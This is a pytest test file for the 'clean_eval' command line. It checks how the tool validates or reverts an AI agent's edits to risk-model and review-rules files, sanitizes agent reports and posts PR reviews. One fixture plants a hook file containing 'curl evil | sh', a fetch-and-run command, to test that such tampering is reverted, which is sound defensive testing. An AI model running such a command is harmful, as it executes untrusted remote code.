"""The command line (external/cli.py): its composition root; the CI commands run in-process over real files, with the
code host mocked (`host` is what cli.github() hands out); and `python -I clean_eval <command>` end to end, in a
subprocess (`run_cli`), on throwaway repositories (`repo`, holding `history`)."""

import datetime as dt
import json
from pathlib import Path

import pytest

from clean_eval.domain.errors import InvalidRequest, RemoteError
from clean_eval.domain.review import HostReview
from clean_eval.external import cli
from clean_eval.external.filesystem import FileSystemGateway
from clean_eval.use_cases.review import lines_on_diff
from clean_eval.use_cases.rules.review import redact
from tests.helpers import Dates

pytestmark = pytest.mark.e2e  # the command line's tests: most run `python -I clean_eval ...` in a subprocess

# The commands `clean_eval --help` lists, in its order.
COMMANDS = ["action", "assess", "finalize", "guard", "history", "post", "prepare", "rate", "readme", "redact", "report"]
# A review-rules.md: a blocker rule from the Low band, and a major and a minor one from Moderate.
RULES = """
| ID | Severity | Min tier | Rule |
|---|---|---|---|
| CA-01 | blocker | Low | dependency rule |
| Q-02 | major | Moderate | failure paths |
| Q-04 | minor | Moderate | clarity |
"""
# The agent's edits of .clean-eval/risk-model.json: one that validates and keeps the AUC; one of the structure, which
# CI may not change; one that drops the only term telling the hot modules from the cold ones, so every PR scores the
# same (AUC 0.5 < 1.0); and a model that was there before the agent ran.
VALID_MODEL = {"business_weights": {"dependents": 0.4}}
STRUCTURAL_MODEL = {"depth": 1}
FLAT_MODEL = {"business_weights": {"dependents": 0}, "effects_mix": {"dependents": 0}}
EARLIER_MODEL = {"depth": 2, "business_weights": {"dependents": 0.35}}
RECOMMENDATION = {"target": "risk-model.json", "change": "c", "evidence": "e"}
# What the review agent proposed: CA-01 at a lower severity than its rule's, and a report with a clean-eval marker of its
# own and a token.
UNDERRATED_BLOCKER = {"rule": "CA-01", "severity": "minor", "file": "a.py", "line": 3, "summary": "s"}
AGENT_REPORT = "## Review\n<!-- clean-eval:pr-review tier=Low -->\nghp_" + "x" * 36
# Findings of a review: a blocker on line 3 of a.py, and a major one on no line, so never attached inline.
BLOCKER = {"rule": "CA-01", "severity": "blocker", "file": "a.py", "line": 3, "summary": "s"}
UNPLACED = {"rule": "Q-02", "severity": "major", "file": None, "line": None, "summary": "s"}
# The context's diff (as `prepare pr-review` writes it): a.py changes line 2, so lines 1-3 take inline comments.
PATCH = "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1,3 +1,3 @@\n x\n-y\n+Y\n z\n"
DIFF = {
    "diff/index.json": [
        {
            "file": "a.py",
            "module": None,
            "patch": "diff/001.patch",
            "patch_lines": 8,
            "added": 1,
            "removed": 1,
            "truncated": False,
        }
    ],
    "diff/001.patch": PATCH,
}
# The reviews on the PR once review 50 is posted: this reviewer's earlier change request (10) is stale, but not a
# human's (11), a comment (12) or the new review itself.
BOT = "github-actions[bot]"
MARKER = "<!-- clean-eval:pr-review tier=High -->"
REVIEWS = [
    HostReview(id=10, state="CHANGES_REQUESTED", user=BOT, body=MARKER),
    HostReview(id=11, state="CHANGES_REQUESTED", user="human", body=MARKER),
    HostReview(id=12, state="COMMENTED", user=BOT, body=MARKER),
    HostReview(id=50, state="CHANGES_REQUESTED", user=BOT, body=MARKER),
]
# Repositories: a billing module (one with tests) and a users module depending on it; then a change of the users module
# that also adds docs and infrastructure.
BILLING = [
    {
        "subject": "init",
        "files": {
            "src/billing/core.py": "import requests\n\ndef charge(x):\n    return requests.post('u', json=x)\n"
            + "\n".join("def f%d(a):\n    return a\n" % number for number in range(60)),
            "src/billing/models.py": "class Invoice:\n    pass\n" * 40,
            "src/users/api.py": "from src.billing.core import charge\n\ndef sign_up(u):\n    return charge(u)\n" * 30,
            "tests/test_core.py": "from src.billing.core import charge\n\ndef test_charge():\n    assert charge\n",
        },
        "when": Dates.days_ago(4),
    },
    {
        "subject": "feat: users",
        "files": {
            "src/users/api.py": "def sign_up(u):\n    return u\n",
            "docs/x.md": "doc\n",
            "infra/main.tf": "resource {}\n",
        },
        "when": Dates.days_ago(2),
    },
]
APP_WITH_README = [
    {
        "subject": "init",
        "files": {"app/a.py": "def a():\n    return 1\n", "README.md": "# App\n"},
        "when": Dates.days_ago(2),
    }
]
V1_POLICY = [
    {
        "subject": "init",
        "files": {"a/b.py": "x = 1\n", ".clean-eval/risk-model.json": '{"window_days": 30}'},
        "when": Dates.days_ago(1),
    }
]
# A feature PR, then a fix of it the next day.
UTC = dt.timezone.utc
FIXED_FEATURE = [
    {"subject": "init", "files": {"src/a/x.py": "1\n"}, "when": dt.datetime(2026, 1, 1, 12, tzinfo=UTC)},
    {"subject": "feat: a (#1)", "files": {"src/a/x.py": "2\n"}, "when": dt.datetime(2026, 2, 1, 12, tzinfo=UTC)},
    {"subject": "fix: a (#2)", "files": {"src/a/x.py": "3\n"}, "when": dt.datetime(2026, 2, 2, 12, tzinfo=UTC)},
]


class TestPeriod:
    """The Period the composition root builds from --since and --until: through the end of the last day, with a window
    of look-ahead; the dates must be YYYY-MM-DD."""

    def test_a_period_runs_through_its_last_day_and_looks_ahead(
        self,
    ):
        period = cli.period("2026-01-01", "2026-01-31", 10)
        assert (period.lookahead_until, period.window_days) == (dt.date(2026, 2, 10), 10)
        assert period.until_ts == dt.datetime(2026, 1, 31, 23, 59, 59, tzinfo=UTC).timestamp()

    def test_a_date_that_is_not_yyyy_mm_dd_is_an_invalid_request(
        self,
    ):
        with pytest.raises(InvalidRequest):
            cli.period("2026-01-01", "soon")


class TestSecrets:
    """The values to redact are the secret-looking variables of this process's environment."""

    @pytest.mark.parametrize("environ", [{"SOME_SECRET": "hunter2-hunter2"}], indirect=True)
    def test_the_secrets_come_from_this_process_environment(
        self,
        process_env,
    ):
        assert redact("pw hunter2-hunter2", cli.secrets())[0] == "pw [REDACTED]"


class TestFinalizeEvalJudgesTheModelEdit:
    """`finalize --skill eval` keeps the agent's edit of .clean-eval/risk-model.json only with --apply, and only when it
    validates and holds the AUC on a sample large enough to tell; otherwise the file is put back as it was before the
    agent ran (removed when it wasn't there)."""

    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": VALID_MODEL}], indirect=True)
    @pytest.mark.parametrize("agent_files", [{"result.json": {"recommendations": [RECOMMENDATION]}}], indirect=True)
    def test_a_valid_edit_is_kept(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        result = json.loads(Path(ci_folders.out, "result.json").read_text())
        assert result["model_change"]["accepted"]
        assert result["applied"]
        assert Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()
        assert "applied=true" in Path(ci_folders.gh_output).read_text()
        assert result["recommendations"] == [RECOMMENDATION]

    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": STRUCTURAL_MODEL}], indirect=True)
    def test_a_structural_edit_is_reverted(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        assert not json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]["accepted"]
        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()  # it wasn't there

    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": FLAT_MODEL}], indirect=True)
    def test_an_edit_that_lowers_the_auc_is_reverted(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        model_change = json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]
        assert not model_change["accepted"]
        assert "below" in model_change["reason"]

    @pytest.mark.parametrize("eval_history", [(3, 10)], indirect=True)
    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": VALID_MODEL}], indirect=True)
    def test_an_edit_on_a_small_sample_is_rejected(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        model_change = json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]
        assert "sample too small" in model_change["reason"]
        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()

    @pytest.mark.parametrize("eval_history", [(0, 30)], indirect=True)
    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": {"unrated_band": "Low"}}], indirect=True)
    def test_an_edit_with_an_undefined_auc_is_rejected(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        assert not json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]["accepted"]
        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()

    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": VALID_MODEL}], indirect=True)
    @pytest.mark.parametrize("finalize_eval_args", [[]], indirect=True)
    def test_without_apply_an_edit_is_rejected(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()
        model_change = json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]
        assert model_change == {"accepted": False, "reason": "apply=false"}

    @pytest.mark.parametrize("tuning", [{"risk-model.json": EARLIER_MODEL}], indirect=True)
    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": None}], indirect=True)
    def test_removing_the_model_is_judged_like_an_edit(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert (
            cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        )  # back to the defaults would also change `depth`: not allowed
        assert not json.loads(Path(ci_folders.out, "result.json").read_text())["model_change"]["accepted"]
        model = Path(ci_folders.ws, ".clean-eval", "risk-model.json")
        assert json.loads(model.read_text()) == EARLIER_MODEL


class TestFinalizeEvalJudgesTheRulesEdit:
    """`finalize --skill eval` keeps the agent's edit of .clean-eval/review-rules.md when its table is valid; removing
    the file, or a table that isn't, is reverted."""

    @pytest.mark.parametrize("tuning", [{"review-rules.md": RULES}], indirect=True)
    @pytest.mark.parametrize(
        "tuning_edits", [{"review-rules.md": RULES + "| Q-05 | major | High | new rule |\n"}], indirect=True
    )
    def test_a_valid_edit_is_kept(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        assert json.loads(Path(ci_folders.out, "result.json").read_text())["rules_change"] == {"accepted": True}
        assert "Q-05" in Path(ci_folders.ws, ".clean-eval", "review-rules.md").read_text()

    @pytest.mark.parametrize("tuning", [{"review-rules.md": RULES}], indirect=True)
    @pytest.mark.parametrize("tuning_edits", [{"review-rules.md": None}], indirect=True)
    def test_removing_the_rules_is_reverted(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        assert json.loads(Path(ci_folders.out, "result.json").read_text())["rules_change"] == {
            "accepted": False,
            "reason": "review-rules.md may not be removed",
        }
        assert Path(ci_folders.ws, ".clean-eval", "review-rules.md").read_text() == RULES

    @pytest.mark.parametrize(
        "tuning_edits", [{"review-rules.md": RULES + "| CA-01 | major | Low | duplicate |\n"}], indirect=True
    )
    def test_a_bad_edit_is_reverted(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        assert not Path(ci_folders.ws, ".clean-eval", "review-rules.md").exists()  # it wasn't there


class TestFinalizeEvalRestoresTheOtherFiles:
    """`finalize --skill eval` puts every other file of .clean-eval/ back as it was: changed, created and deleted
    ones."""

    @pytest.mark.parametrize("tuning", [{"notes.md": "original", "sub/keep.txt": "k"}], indirect=True)
    @pytest.mark.parametrize(
        "tuning_edits",
        [{"notes.md": "tampered", "hooks.sh": "curl evil | sh", "sub/keep.txt": None}],
        indirect=True,
    )
    def test_other_clean_eval_files_restored(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 0
        tuning_dir = Path(ci_folders.ws, ".clean-eval")
        assert (tuning_dir / "notes.md").read_text() == "original"
        assert not (tuning_dir / "hooks.sh").exists()
        assert (tuning_dir / "sub" / "keep.txt").read_text() == "k"
        assert json.loads(Path(ci_folders.out, "result.json").read_text())["other_files_reverted"] == [
            "hooks.sh",
            "notes.md",
            str(Path("sub", "keep.txt")),
        ]


@pytest.mark.parametrize("tuning_edits", [{"risk-model.json": VALID_MODEL}], indirect=True)
class TestFinalizeEvalFailsClosed:
    """When the agent's output or the history can't be trusted, `finalize --skill eval` exits 2 and reverts every edit,
    even one that would pass."""

    @pytest.mark.parametrize("agent_files", [{"result.json": "not json"}], indirect=True)
    def test_invalid_agent_output_reverts_accepted_edits(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        result = cli_runner.invoke(cli.clean_eval, finalize_eval_args)
        assert result.exit_code == 2
        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()
        assert not Path(ci_folders.out, "result.json").exists()
        assert "::error::clean-eval: invalid agent output" in result.stderr

    @pytest.mark.parametrize("context_files", [{"eval-history.json": "{broken"}], indirect=True)
    def test_unreadable_history_reverts_edits(
        self,
        finalize_eval_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_eval_args).exit_code == 2
        assert not Path(ci_folders.ws, ".clean-eval", "risk-model.json").exists()


class TestFinalizeReview:
    """`finalize --skill pr-review` derives the verdict and the step outputs from the agent's findings and the rules,
    and sanitizes the agent's report; an output that doesn't validate writes nothing."""

    @pytest.mark.parametrize(
        "agent_files", [{"result.json": {"findings": [UNDERRATED_BLOCKER]}, "report.md": AGENT_REPORT}], indirect=True
    )
    def test_outputs_are_derived_and_the_report_sanitized(
        self,
        finalize_review_args,
        risk_report,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_review_args).exit_code == 0
        assert Path(ci_folders.gh_output).read_text().splitlines() == [
            "verdict=request_changes",  # CA-01 is a blocker, whatever severity the agent gave it
            "max-tier=%s" % risk_report.max_tier,
            "max-score=%d" % risk_report.max_score,
            "blockers=1",
        ]
        report = Path(ci_folders.out, "report.md").read_text()
        assert "clean-eval:" not in report
        assert "ghp_" not in report
        assert json.loads(Path(ci_folders.out, "result.json").read_text())["redactions"] == 1

    @pytest.mark.parametrize("agent_files", [{"result.json": "[]"}], indirect=True)
    def test_invalid_output_writes_nothing(
        self,
        finalize_review_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_review_args).exit_code == 2
        assert not Path(ci_folders.out, "result.json").exists()
        assert not Path(ci_folders.gh_output).exists()


@pytest.mark.parametrize("agent_review", [{"findings": [BLOCKER, UNPLACED]}], indirect=True)
class TestPost:
    """`post` puts the validated review up as one review of the PR's head commit, falling back to fewer inline comments
    when the host rejects them, then dismisses this reviewer's stale change requests; it fails only when no attempt
    went up."""

    @pytest.mark.parametrize(
        "host",
        [
            {
                "post_review.side_effect": [
                    RemoteError("gh api -X failed: HTTP 422: line must be part of the diff"),
                    HostReview(id=50, user=BOT),
                ],
                "reviews.return_value": REVIEWS,
            }
        ],
        indirect=True,
    )
    def test_fallbacks_and_dismissal(
        self,
        host,
        post_args,
        risk_report,
        cli_runner,
    ):
        assert cli_runner.invoke(cli.clean_eval, post_args).exit_code == 0
        assert [made.args[0] for made in host.post_review.call_args_list] == [1, 1]
        posts = [made.args[1] for made in host.post_review.call_args_list]
        assert [(post.event, post.commit_id) for post in posts] == [("REQUEST_CHANGES", risk_report.head)] * 2
        assert posts[0].comments
        assert posts[1].comments == []  # retried without inline comments
        assert "clean-eval:pr-review tier=%s" % risk_report.max_tier in posts[1].body
        assert "rules=CA-01,Q-02" in posts[1].body
        assert "score=%d " % risk_report.max_score in posts[1].body  # scores are integers 0-100
        host.dismiss_review.assert_called_once_with(
            1, 10, "Superseded by the clean-eval review of %s" % risk_report.head[:8]
        )

    @pytest.mark.parametrize(
        "host", [{"post_review.side_effect": RemoteError("gh api -X failed: HTTP 403")}], indirect=True
    )
    def test_all_attempts_fail(
        self,
        host,
        post_args,
        cli_runner,
    ):
        assert cli_runner.invoke(cli.clean_eval, post_args).exit_code == 1
        assert host.post_review.call_count == 4
        host.reviews.assert_not_called()

    @pytest.mark.parametrize(
        "host",  # HostReview(): what the gateway makes of a reply to a post that it can't read
        [{"post_review.return_value": HostReview(), "reviews.return_value": []}],
        indirect=True,
    )
    def test_an_unreadable_reply_is_not_posted_twice(
        self,
        host,
        post_args,
        cli_runner,
    ):
        assert cli_runner.invoke(cli.clean_eval, post_args).exit_code == 0
        host.post_review.assert_called_once()
        host.dismiss_review.assert_not_called()


@pytest.mark.parametrize(
    "agent_review",
    [{"findings": [{**BLOCKER, "line": 40}, UNPLACED, {**BLOCKER, "line": 2, "summary": "on diff"}]}],
    indirect=True,
)
@pytest.mark.parametrize("context_files", [DIFF], indirect=True)
@pytest.mark.parametrize(
    "host", [{"post_review.return_value": HostReview(id=5, user="x[bot]"), "reviews.return_value": []}], indirect=True
)
class TestPostOnTheDiff:
    """With the diff in the context, `post` attaches inline only the findings on lines of the diff, which GitHub
    accepts, and lists the others in the review's body."""

    def test_only_on_diff_comments_attached(
        self,
        host,
        post_args,
        cli_runner,
        ci_folders,
    ):
        assert lines_on_diff(FileSystemGateway(), ci_folders.ctx) == {"a.py": {1, 2, 3}}
        assert cli_runner.invoke(cli.clean_eval, post_args).exit_code == 0
        host.post_review.assert_called_once()  # no 422 retry needed
        post = host.post_review.call_args.args[1]
        assert [comment.line for comment in post.comments] == [2]
        assert "`a.py:40`" in post.body


class TestCommands:
    """The commands of the command line: the README section is the only publishing output, so the old ones are gone."""

    def test_the_usage_lists_the_commands(
        self,
        run_cli,
        tmp_path,
    ):
        usage = run_cli("--help", cwd=tmp_path).stdout
        listed = [line.split()[0] for line in usage.split("Commands:\n", 1)[1].splitlines() if line.strip()]
        assert listed == COMMANDS
        assert run_cli("-h", cwd=tmp_path).stdout == usage

    @pytest.mark.parametrize("gone", ["render", "diagram"])
    def test_a_removed_command_fails(
        self,
        run_cli,
        tmp_path,
        gone,
    ):
        assert run_cli(gone, "x", cwd=tmp_path).returncode != 0


@pytest.mark.parametrize("history", [BILLING], indirect=True)
class TestRate:
    """`rate` rates the working tree, or a past revision read from git objects, into data.json; `report` summarizes
    it."""

    def test_rate_and_report(
        self,
        repo,
        run_cli,
        tmp_path,
    ):
        rated = run_cli("rate", "--depth", "2", "--out", str(tmp_path), cwd=repo.path)
        assert rated.returncode == 0, rated.stderr
        data = json.loads((tmp_path / "data.json").read_text())
        assert sorted(module["name"] for module in data["modules"]) == ["src/billing", "src/users"]
        assert "Policy: clean-eval default" in data["notes"]
        report = run_cli("report", str(tmp_path / "data.json"), cwd=repo.path)
        assert "| `src/" in report.stdout

    def test_rate_a_past_revision(
        self,
        repo,
        shas,
        run_cli,
        tmp_path,
    ):
        rated = run_cli("rate", "--rev", shas[0], "--out", str(tmp_path), cwd=repo.path)
        assert rated.returncode == 0, rated.stderr
        assert json.loads((tmp_path / "data.json").read_text())["ref"] == shas[0]

    def test_a_past_revision_takes_only_the_builtin_graph(
        self,
        repo,
        shas,
        run_cli,
        tmp_path,
    ):
        refused = run_cli(
            "rate", "--rev", shas[0], "--graph", "code-review-graph", "--out", str(tmp_path), cwd=repo.path
        )
        assert refused.returncode != 0
        assert "only --graph builtin" in refused.stderr


@pytest.mark.parametrize("history", [BILLING], indirect=True)
class TestAssess:
    """`assess` rates the base of a change and gives the risk of each path it changes."""

    def test_assess_a_change_from_its_base(
        self,
        repo,
        shas,
        run_cli,
    ):
        assessed = run_cli("assess", "--base", shas[0], "--head", shas[1], cwd=repo.path)
        assert assessed.returncode == 0, assessed.stderr
        risk = json.loads(assessed.stdout)
        assert risk["files"]["src/users/api.py"] == "src/users"
        assert risk["ignored"] == ["docs/x.md"]
        modules = {module["module"]: module for module in risk["modules"]}
        assert not modules["infra"]["rated"]
        assert modules["infra"]["band"] == "Moderate"
        assert risk["max_band"] in ("Moderate", "High", "Critical")


@pytest.mark.parametrize("history", [APP_WITH_README], indirect=True)
class TestReadme:
    """`readme` writes the heat map into the README's section and the diagram once, then leaves them alone while the
    ratings stay the same."""

    def test_readme_is_written_once_then_left_alone(
        self,
        repo,
        run_cli,
        tmp_path,
    ):
        data, status = str(tmp_path / "data.json"), tmp_path / "status.json"
        assert run_cli("rate", "--out", str(tmp_path), cwd=repo.path).returncode == 0
        first = run_cli("readme", data, "--status-json", str(status), cwd=repo.path)
        assert first.returncode == 0, first.stderr
        assert json.loads(status.read_text())["readme_changed"]
        text = Path(repo.path, "README.md").read_text()
        assert text.startswith("# App\n\n## Risk Heat Map\n\n<!-- risk-heat-map:start -->")
        assert "](docs/risk-heatmap.svg)" in text
        assert Path(repo.path, "docs", "risk-heatmap.svg").exists()
        again = run_cli("readme", data, "--status-json", str(status), cwd=repo.path)
        assert "unchanged" in again.stdout
        assert not json.loads(status.read_text())["readme_changed"]


@pytest.mark.parametrize("history", [V1_POLICY], indirect=True)
class TestAnInvalidPolicy:
    """A repository's risk-model.json that doesn't validate is reported, with a non-zero status, not raised."""

    def test_invalid_policy_is_reported_not_raised(
        self,
        repo,
        run_cli,
        tmp_path,
    ):
        rated = run_cli("rate", "--out", str(tmp_path), cwd=repo.path)
        assert rated.returncode != 0
        assert "v1 model" in rated.stderr
        assert "Traceback" not in rated.stderr


class TestHistoryCommand:
    """The eval skill runs `uv run ... python -I <checkout>/clean_eval history ...` from the repository it evaluates."""

    @pytest.mark.parametrize("history", [FIXED_FEATURE], indirect=True)
    def test_replay_and_sensitivity_from_any_folder(
        self,
        repo,
        run_cli,
        tmp_path,
    ):
        collected, candidate = str(tmp_path / "h.json"), tmp_path / "candidate.json"
        res = run_cli("history", "--since", "2026-01-15", "--until", "2026-02-28", "--out", collected, cwd=repo.path)
        assert res.returncode == 0, res.stderr
        assert "2 PRs, 1 with escaped defects" in res.stderr
        candidate.write_text(json.dumps({"business_weights": {"dependents": 0.4}}))
        replayed = run_cli("history", "--from-history", collected, "--replay", str(candidate), cwd=repo.path)
        assert set(json.loads(replayed.stdout)) == {"auc_max_score", "by_band", "band_mix"}
        rows = json.loads(run_cli("history", "--from-history", collected, "--sensitivity", cwd=repo.path).stdout)
        assert rows[0]["change"] == "baseline"

    @pytest.mark.parametrize(
        ("args", "message"),
        [
            (["--sensitivity"], "need --from-history"),
            ([], "--since is required"),
            (["--since", "last week"], "YYYY-MM-DD"),
        ],
        ids=["sensitivity without a history", "no period", "not a date"],
    )
    def test_usage_errors_are_reported_not_raised(
        self,
        repo,
        run_cli,
        args,
        message,
    ):
        res = run_cli("history", *args, cwd=repo.path)
        assert res.returncode != 0
        assert message in res.stderr
        assert "Traceback" not in res.stderr
